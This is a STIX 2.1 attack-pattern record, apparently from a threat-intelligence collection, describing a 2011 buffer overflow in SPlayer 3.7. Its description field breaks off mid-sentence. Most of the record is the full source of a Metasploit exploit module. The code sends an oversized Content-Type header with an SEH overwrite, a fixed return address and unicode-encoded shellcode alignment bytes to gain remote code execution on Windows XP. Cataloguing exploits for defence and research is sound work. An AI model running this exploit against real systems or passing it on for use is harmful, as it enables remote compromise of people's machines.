{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--bf8dfd7a-5170-4c6a-a6e9-e37cab2f56c7",
    "created": "2024-08-14T16:46:01.77596Z",
    "modified": "2024-08-14T16:46:01.775964Z",
    "name": "\"SPlayer 3.7 Content-Type Buffer Overflow\"",
    "description": " This module exploits a vulnerability in SPlayer v3.7 or prior.  When SPlayer",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/misc/splayer_content_type.rb",
            "external_id": "splayer_content_type.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::Remote::HttpServer::HTML\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => \"SPlayer 3.7 Content-Type Buffer Overflow\",\n      'Description'    => %q{\n          This module exploits a vulnerability in SPlayer v3.7 or prior.  When SPlayer\n        requests the URL of a media file (video or audio), it is possible to gain arbitrary\n        remote code execution due to a buffer overflow caused by an exceeding length of data\n        as the 'Content-Type' parameter.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'xsploitedsec <xsploitedsecurity[at]gmail.com>',  #Initial discovery, PoC\n          'sinn3r', #Metasploit\n        ],\n      'References'     =>\n        [\n          ['OSVDB', '72181'],\n          ['EDB', '17243'],\n        ],\n      'Payload'        =>\n        {\n          'BadChars'        => \"\\x00\\x0a\\x0d\\x80\\x82\\x83\\x84\\x85\\x86\\x87\\x88\\x89\\x8a\\x8b\\x8c\\x8d\\x8e\\x8f\\x91\\x92\\x93\\x94\\x95\\x96\\x97\\x98\\x99\\x9a\\x9b\\x9c\\x9d\\x9e\\x9f\",\n          'StackAdjustment' => -3500,\n          'EncoderType'     => Msf::Encoder::Type::AlphanumMixed,\n          'BufferRegister'  => 'ECX',\n        },\n      'DefaultOptions'  =>\n        {\n          'EXITFUNC'         => \"seh\",\n          'InitialAutoRunScript' => 'post/windows/manage/priv_migrate',\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [\n            'Windows XP SP2/XP3',\n            {\n              'Offset' => 2073,    #Offset to SEH\n              'Ret'    => 0x7325,  #Unicode P/P/R (splayer.exe)\n              'Max'    => 30000,   #Max buffer size\n            }\n          ],\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2011-05-04',\n      'DefaultTarget'  => 0))\n  end\n\n  def get_unicode_payload(p)\n    encoder = framework.encoders.create(\"x86/unicode_mixed\")\n    encoder.datastore.import_options_from_hash( {'BufferRegister'=>'EAX'} )\n    unicode_payload = encoder.encode(p, nil, nil, platform)\n    return unicode_payload\n  end\n\n  def on_request_uri(cli, request)\n\n    agent = request.headers['User-Agent']\n    if agent !~ /Media Player Classic/\n      send_not_found(cli)\n      print_error(\"Unknown user-agent\")\n      return\n    end\n\n    nop = \"\\x73\"\n\n    #MOV EAX,EDI; XOR AL,C3; INC EAX; XOR AL,79; PUSH EAX; POP ECX; JMP SHORT 0x40\n    alignment = \"\\x8b\\xc7\\x34\\xc3\\x40\\x34\\x79\\x50\\x59\\xeb\\x40\"\n    padding = nop*6\n    p = get_unicode_payload(alignment + padding + payload.encoded)\n\n    sploit = rand_text_alpha(2073)\n    sploit << \"\\x61\\x73\"\n    sploit << \"\\x25\\x73\"\n    sploit << nop\n    sploit << \"\\x55\"\n    sploit << nop\n    sploit << \"\\x58\"\n    sploit << nop\n    sploit << \"\\x05\\x19\\x11\"\n    sploit << nop\n    sploit << \"\\x2d\\x11\\x11\"\n    sploit << nop\n    sploit << \"\\x50\"\n    sploit << nop\n    sploit << \"\\x50\"\n    sploit << nop\n    sploit << \"\\x5f\"\n    sploit << nop\n    sploit << \"\\xc3\"\n    sploit << rand_text_alpha(1000)\n    sploit << p\n    sploit << rand_text_alpha(target['Max']-sploit.length)\n\n    print_status(\"Sending malicious content-type\")\n    send_response(cli, '', {'Content-Type'=>sploit})\n\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ],
    "x_mitre_disclosure_date": "2011-05-04",
    "x_mitre_platforms": [
        "win'"
    ]
}